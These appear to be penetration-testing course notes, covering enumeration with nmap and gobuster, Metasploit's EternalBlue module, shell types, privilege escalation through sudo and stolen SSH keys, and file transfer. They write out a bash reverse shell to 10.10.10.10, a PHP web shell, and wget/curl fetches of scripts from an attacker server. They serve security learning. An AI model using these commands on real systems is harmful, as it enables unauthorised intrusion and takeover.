## 1. Information Security Overview & Penetration Testing

### Field Overview
- **Scope:** Network/infrastructure security, application security, security testing, auditing, business continuity, digital forensics, incident response.
- **CIA Triad:** Confidentiality, Integrity, Availability.
- **Risk Management Process:**
  - **Identify:** List potential risks (legal, regulatory, environmental, etc.).
  - **Analyze:** Determine the impact and probability of each risk.
  - **Evaluate:** Prioritize risks and decide whether to accept, avoid, control, or transfer them.
  - **Deal:** Implement measures to mitigate or contain risks.
  - **Monitor:** Continuously monitor for changes in risk levels.

### Red Team vs. Blue Team
- **Red Team:** Simulates attacker techniques (e.g., penetration testing, social engineering).
- **Blue Team:** Focuses on defense by strengthening security, analyzing risks, and responding to incidents.

### Role of a Penetration Tester
- Identify vulnerabilities in external and internal systems.
- Provide reproducible proofs and recommendations for remediation.
- Work with various assessments (white-box, phishing, red team exercises) to build a complete picture of the target’s security posture.

---

## 2. Organization & Documentation

### Staying Organized
- **Folder Structure Example:**
~~~~
Projects/
├── Acme Company
│   ├── EPT
│   │   ├── scans
│   │   ├── logs
│   │   ├── evidence (credentials, data, screenshots)
│   │   ├── scope
│   │   └── tools
│   └── IPT
│       ├── scans
│       ├── logs
│       ├── evidence
│       ├── scope
│       └── tools
~~~~
- **Note-Taking Tools:** Visual Studio Code, Notion, GitBook, Sublime Text, etc.
- **Knowledge Base:** Maintain a cheat sheet for common commands, checklists, and report templates.

---

## 3. Connecting via VPN

- **VPN Connection**
- Use VPN to connect to private networks (e.g., HTB VPN).
- **Example Command:**
  ```bash
  sudo openvpn user.ovpn
  ```
- Verify connection using `ifconfig` (look for `tun0`) and `netstat -rn`.

---

## 4. Common Terms & Concepts

- **Shell:** A command-line interface (e.g., Bash, PowerShell) used for system interaction.
- **Ports:** Logical communication endpoints (e.g., 21 for FTP, 22 for SSH, 80/443 for HTTP/HTTPS).
- **Web Server:** Software (e.g., Apache, Nginx) hosting web applications; vulnerability assessments often reference the OWASP Top 10.

---

## 5. Service Scanning & Enumeration

### Nmap Scanning
- **Basic Scan** (first 1,000 common ports):
```bash
nmap <target_ip>
```
-> Analysis: Identify services (e.g., vsFTPd 3.0.3, OpenSSH, Apache, Samba) and operating systems.

### Web Enumeration
- **Directory/File Brute Forcing**
Use Gobuster:
```bash
gobuster dir -u http://<target_ip>/ -w /usr/share/seclists/Discovery/Web-Content/common.txt
```

- **Subdomain Enumeration** 
Use Gobuster in DNS mode with a wordlist.

- **Banner Grabbing & Fingerprinting** 
Tools: Use WhatWeb or cURL to extract server headers and framework information.

---

## 6. Public Exploits & Metasploit Primer

- **Finding Public Exploits**
Use SearchSploit:

```bash
searchsploit openssh 7.2
```

Tip: Explore online databases such as Exploit DB, Rapid7, or Vulnerability Lab.

- **Metasploit Framework**
Launch Metasploit:
```bash
msfconsole
```
Example: Searching for an EternalBlue exploit:
```bash
search exploit eternalblue
```
Module Configuration:
Use a module (e.g., exploit/windows/smb/ms17_010_psexec), set options:
```bash
use exploit/windows/smb/ms17_010_psexec
set RHOSTS <target_ip>
set LHOST <your_IP_or_interface>
check
exploit
```
Look for errors in the configuration:
```bash
check
```
---

## 7. Types of Shells

### Reverse Shell
- **Concept:**  
  The target machine connects back to your listener.

- **Listener Setup (Netcat):**
  ```bash
  nc -lvnp 1234
  ```
Example Bash Reverse Shell Command:
```bash
bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
```

-**Bind Shell**

Concept: The target machine binds a shell to a port; you connect to it.
Example: Commands in Bash, Python, or PowerShell (refer to Payload All The Things for more).

-**Web Shell**

Concept: A script (e.g., PHP) on the webserver that accepts commands via HTTP.

Example PHP Web Shell:
```php
<?php system($_REQUEST["cmd"]); ?>
```
Usage: Access via a browser (e.g., http://target/shell.php?cmd=id).

- **Upgrading TTY**

Improve a Basic Shell (e.g., from netcat) to an Interactive TTY:
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
stty raw -echo; fg
export TERM=xterm-256color
stty rows <rows> columns <columns>
```

---

## 8. Privilege Escalation

-**Overview**
Initial access is often with low privileges. The goal is to gain root (Linux) or SYSTEM/Administrator (Windows) access.

Enumeration & Checklists
- Tools & Scripts:
- LinPEAS
- linuxprivchecker
- Seatbelt
- JAWS
- HackTricks
- PayloadsAllTheThings

- **Common Vectors**
- Kernel Exploits
Example: DirtyCow for older Linux kernels.

- Vulnerable Software
Identify outdated software via dpkg -l or by examining installed applications.

- User Privileges
Check Sudo Permissions:
```bash
sudo -l
```
Exploitation: Use misconfigured sudo rights (e.g., NOPASSWD entries) to switch users.

-**SSH Keys**
If you can read a user’s private key (e.g., /root/.ssh/id_rsa), use it to SSH as that user:
```bash
nano id_rsa #we copy/paste the id_rsa file into the attacker machine
chmod 600 id_rsa
ssh root@<target_ip> -i id_rsa
```

- **Example Workflow (Based on Exercise)**
  
- SSH into the target:

```bash
ssh -l user1 <target_ip> -p <port>
```
- Switch from user1 to user2:

```bash
sudo -u user2 /bin/bash
```
- Read the flag for user2:

```bash
cat /home/user2/flag.txt
```
- Change directory to use privilege:

```bash
cd /home/user2
```
- Extract the SSH key from /root/.ssh/id_rsa and use it to SSH as root:

```bash
ssh root@<target_ip> -p <port> -i id_rsa
```
- Read the root flag:

```bash
cat /root/flag.txt
```
  
## 9. Transferring Files

### Using `wget`/`cURL`

- **Set Up a Python HTTP Server**:  
```bash
cd /tmp
python3 -m http.server 8000
```
- **Download from the Target:**

Using wget:
```bash
wget http://10.10.14.1:8000/linenum.sh
```

Using cURL:
```bash
curl http://10.10.14.1:8000/linenum.sh -o linenum.sh
```
Using SCP:
Transfer a file if SSH credentials are available:

```bash
scp linenum.sh user@remotehost:/tmp/linenum.sh
```
Using Base64:
Encode the File:

```bash
base64 shell -w 0
```
On the Target, Decode It:

```bash
echo <base64_string> | base64 -d > shell
```
Verify Integrity:

```bash
md5sum shell
```






